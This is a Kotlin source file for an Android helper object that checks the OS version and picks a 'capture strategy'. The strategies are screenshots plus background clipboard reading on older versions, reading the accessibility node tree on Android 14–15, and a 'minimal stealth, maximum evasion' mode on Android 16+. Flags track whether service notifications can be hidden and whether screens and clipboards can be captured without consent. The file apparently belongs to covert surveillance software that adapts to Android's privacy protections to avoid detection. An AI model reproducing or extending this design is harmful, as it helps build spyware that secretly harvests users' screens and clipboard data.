package com.android.myapp.core

import android.app.Application
import android.os.Build
import androidx.annotation.ChecksSdkIntAtLeast
import java.util.concurrent.atomic.AtomicReference

/**
 * Centralized Android version capability detection and management.
 *
 * This class provides a unified interface for checking Android version-specific
 * capabilities and adapting behavior accordingly.
 *
 * Usage:
 * ```
 * // In Application.onCreate()
 * VersionManager.initialize(this)
 *
 * // Anywhere in the app
 * val caps = VersionManager.getCapabilities()
 * if (caps.requiresForegroundService) {
 *     startForegroundService()
 * }
 * ```
 */
object VersionManager {

    /**
     * Capability flags for different Android versions
     */
    data class Capabilities(
        /** Current Android API level */
        val apiLevel: Int,

        // Android 14+ (API 34 - UPSIDE_DOWN_CAKE)
        /** Android 14+ requires accessibility services to run as foreground services */
        val requiresForegroundService: Boolean,
        /** Android 14+ cannot hide foreground service notifications */
        val canHideNotification: Boolean,
        /** Android 14+ requires repeated user consent for screenshot capture */
        val canCaptureScreen: Boolean,

        // Android 15+ (API 35)
        /** Android 15+ has Private Space feature (apps are isolated) */
        val hasPrivateSpace: Boolean,
        /** Android 15+ restricts clipboard access to foreground apps only */
        val requiresForegroundForClipboardRead: Boolean,
        /** Android 15+ clipboard can only be accessed when app is in foreground */
        val canAccessClipboardInBackground: Boolean,

        // Android 13+ (API 33 - TIRAMISU)
        /** Android 13+ requires runtime permission for posting notifications */
        val requiresPostNotificationsPermission: Boolean,

        // Android 12+ (API 31 - S)
        /** Android 12+ enforces exact alarm permissions */
        val requiresExactAlarmPermission: Boolean,

        // Android 10+ (API 29 - Q)
        /** Android 10+ restricts background location access */
        val requiresBackgroundLocationPermission: Boolean,
        /** Android 10+ scoped storage restrictions */
        val hasScopedStorage: Boolean,

        // Android 8+ (API 26 - O)
        /** Android 8+ supports notification channels */
        val supportsNotificationChannels: Boolean,

        // Strategy recommendations
        /** Recommended capture strategy for this Android version */
        val recommendedStrategy: CaptureStrategy
    )

    /**
     * Capture strategies based on Android version
     */
    enum class CaptureStrategy {
        /** Full featured - Screenshots, background clipboard, etc. (Android < 14) */
        FULL_FEATURED,

        /** Node-based - Use AccessibilityNodeInfo tree instead of screenshots (Android 14-15) */
        NODE_BASED,

        /** Minimal stealth - Maximum evasion, minimal features (Android 16+) */
        MINIMAL_STEALTH
    }

    private val appRef = AtomicReference<Application?>(null)
    private val capsRef = AtomicReference<Capabilities?>(null)

    /**
     * Initialize VersionManager with Application context.
     * Call this in Application.onCreate()
     */
    @JvmStatic
    fun initialize(application: Application) {
        appRef.set(application)
        // Precompute capabilities once for fast access
        capsRef.set(computeCapabilities())
    }

    /**
     * Get current Android version capabilities.
     * Computes on-demand if initialize() wasn't called.
     */
    @JvmStatic
    fun getCapabilities(): Capabilities {
        return capsRef.get() ?: computeCapabilities().also {
            capsRef.set(it)
        }
    }

    /**
     * Get Application instance.
     * Throws if initialize() wasn't called.
     */
    @JvmStatic
    fun application(): Application {
        return appRef.get()
            ?: error("VersionManager not initialized. Call VersionManager.initialize(app) in Application.onCreate()")
    }

    /**
     * Check if device is running Android API level or higher
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(parameter = 0)
    fun isAtLeast(api: Int): Boolean = Build.VERSION.SDK_INT >= api

    /**
     * Check if device is running Android 16+ (API 36+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = 36)
    fun isAndroid16OrHigher(): Boolean = Build.VERSION.SDK_INT >= 36

    /**
     * Check if device is running Android 15+ (API 35+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = 35)
    fun isAndroid15OrHigher(): Boolean = Build.VERSION.SDK_INT >= 35

    /**
     * Check if device is running Android 14+ (API 34+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
    fun isAndroid14OrHigher(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE

    /**
     * Check if device is running Android 13+ (API 33+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = Build.VERSION_CODES.TIRAMISU)
    fun isAndroid13OrHigher(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU

    /**
     * Check if device is running Android 12+ (API 31+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = Build.VERSION_CODES.S)
    fun isAndroid12OrHigher(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S

    /**
     * Check if device is running Android 10+ (API 29+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = Build.VERSION_CODES.Q)
    fun isAndroid10OrHigher(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q

    /**
     * Check if device is running Android 8+ (API 26+)
     */
    @JvmStatic
    @ChecksSdkIntAtLeast(api = Build.VERSION_CODES.O)
    fun isAndroid8OrHigher(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O

    /**
     * Get human-readable Android version name
     */
    @JvmStatic
    fun getVersionName(): String {
        return when (Build.VERSION.SDK_INT) {
            36 -> "Android 16"
            35 -> "Android 15"
            Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> "Android 14"
            Build.VERSION_CODES.TIRAMISU -> "Android 13"
            Build.VERSION_CODES.S_V2, Build.VERSION_CODES.S -> "Android 12"
            Build.VERSION_CODES.R -> "Android 11"
            Build.VERSION_CODES.Q -> "Android 10"
            Build.VERSION_CODES.P -> "Android 9 (Pie)"
            Build.VERSION_CODES.O_MR1, Build.VERSION_CODES.O -> "Android 8 (Oreo)"
            else -> "Android ${Build.VERSION.SDK_INT}"
        }
    }

    /**
     * Compute capabilities based on current Android version
     */
    private fun computeCapabilities(): Capabilities {
        val api = Build.VERSION.SDK_INT

        return Capabilities(
            apiLevel = api,

            // Android 14+ (API 34)
            requiresForegroundService = api >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE,
            canHideNotification = api < Build.VERSION_CODES.UPSIDE_DOWN_CAKE,
            canCaptureScreen = api < Build.VERSION_CODES.UPSIDE_DOWN_CAKE,

            // Android 15+ (API 35)
            hasPrivateSpace = api >= 35,
            requiresForegroundForClipboardRead = api >= 35,
            canAccessClipboardInBackground = api < 35,

            // Android 13+ (API 33)
            requiresPostNotificationsPermission = api >= Build.VERSION_CODES.TIRAMISU,

            // Android 12+ (API 31)
            requiresExactAlarmPermission = api >= Build.VERSION_CODES.S,

            // Android 10+ (API 29)
            requiresBackgroundLocationPermission = api >= Build.VERSION_CODES.Q,
            hasScopedStorage = api >= Build.VERSION_CODES.Q,

            // Android 8+ (API 26)
            supportsNotificationChannels = api >= Build.VERSION_CODES.O,

            // Strategy
            recommendedStrategy = determineStrategy(api)
        )
    }

    /**
     * Determine recommended capture strategy based on Android version
     */
    private fun determineStrategy(api: Int): CaptureStrategy {
        return when {
            api >= 36 -> CaptureStrategy.MINIMAL_STEALTH  // Android 16+
            api >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> CaptureStrategy.NODE_BASED  // Android 14-15
            else -> CaptureStrategy.FULL_FEATURED  // Android < 14
        }
    }

    /**
     * Log current capabilities (for debugging)
     */
    @JvmStatic
    fun logCapabilities() {
        val caps = getCapabilities()
        println("=== Android Version Capabilities ===")
        println("Version: ${getVersionName()} (API ${caps.apiLevel})")
        println("Strategy: ${caps.recommendedStrategy}")
        println()
        println("Android 14+ Features:")
        println("  Foreground Service Required: ${caps.requiresForegroundService}")
        println("  Can Hide Notification: ${caps.canHideNotification}")
        println("  Can Capture Screen: ${caps.canCaptureScreen}")
        println()
        println("Android 15+ Features:")
        println("  Has Private Space: ${caps.hasPrivateSpace}")
        println("  Foreground Clipboard Required: ${caps.requiresForegroundForClipboardRead}")
        println("  Background Clipboard Access: ${caps.canAccessClipboardInBackground}")
        println()
        println("Other Features:")
        println("  POST_NOTIFICATIONS Required: ${caps.requiresPostNotificationsPermission}")
        println("  Exact Alarm Permission: ${caps.requiresExactAlarmPermission}")
        println("  Notification Channels: ${caps.supportsNotificationChannels}")
        println("====================================")
    }
}